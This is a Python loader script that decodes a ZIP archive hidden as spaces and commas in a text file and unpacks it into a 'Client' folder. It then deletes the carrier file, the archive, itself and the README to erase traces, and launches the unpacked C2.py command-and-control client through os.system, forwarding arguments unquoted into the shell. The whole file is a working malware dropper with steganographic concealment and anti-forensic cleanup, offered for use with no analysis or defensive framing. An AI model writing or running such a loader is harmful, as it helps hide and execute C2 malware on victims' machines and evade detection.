#!/usr/bin/env python3
# Bootstrap script to decode an embedded ZIP from whitespace steganography
# Unpacks to 'Client' and launches C2.py, cleaning up artifacts.

import pathlib
import os
import shutil
import sys


def decode(bits, encoding='utf-8', errors='surrogatepass'):
    """
    Convert a string of spaces (" ") and commas (",") into raw bytes.
    - Spaces map to binary '0'.
    - Commas map to binary '1'.
    The resulting bitstring is parsed into an integer and converted to big-endian bytes.
    Returns at least a null byte if the integer is zero.
    """
    # Replace space -> '0', comma -> '1', parse as binary
    n = int(bits.replace(" ", "0").replace(",", "1"), 2)
    # Calculate byte length and convert; ensure non-empty output
    return n.to_bytes((n.bit_length() + 7) // 8, 'big') or b'\0'


def recover_file(input_path):
    """
    Extract steganographic bits from a text file and decode to bytes.
    - Reads only space and comma characters from each line.
    - Builds a continuous bitstream, with commas representing '1'.
    - Feeds the bitstream into decode().
    """
    bitstream = ""
    with open(input_path, "r") as f:
        for line in f:
            # Keep only space or comma characters
            bitstream += ''.join(ch for ch in line if ch in [' ', ','])
    # Decode the assembled bitstream to raw bytes
    return decode(bitstream)


if __name__ == '__main__':
    # Step 1: Recover embedded ZIP data from 'pack.txt'
    zip_bytes = recover_file('pack.txt')

    # Step 2: Write recovered binary to 'client.zip'
    with open('client.zip', 'wb') as out_file:
        out_file.write(zip_bytes)

    # Step 3: Unpack 'client.zip' into 'Client' directory
    shutil.unpack_archive('client.zip', 'Client')

    # Step 4: Remove bootstrap artifacts
    try:
        os.remove('pack.txt')
        os.remove('client.zip')
    except OSError:
        pass  # Missing files are ignored

    # Remove loader script if present
    try:
        os.remove('loader.py')
    except FileNotFoundError:
        pass

    # Optionally delete README.md to clean workspace
    readme_path = pathlib.Path('README.md')
    if readme_path.exists():
        readme_path.unlink()

    # Step 5: Launch the Client's C2.py using the same Python interpreter
    python_exec = sys.executable
    # Forward any CLI arguments to the client
    cmd_args = ' '.join(sys.argv[1:])
    # Change into 'Client' directory and execute C2.py
    os.system(f"cd Client && \"{python_exec}\" C2.py {cmd_args}")
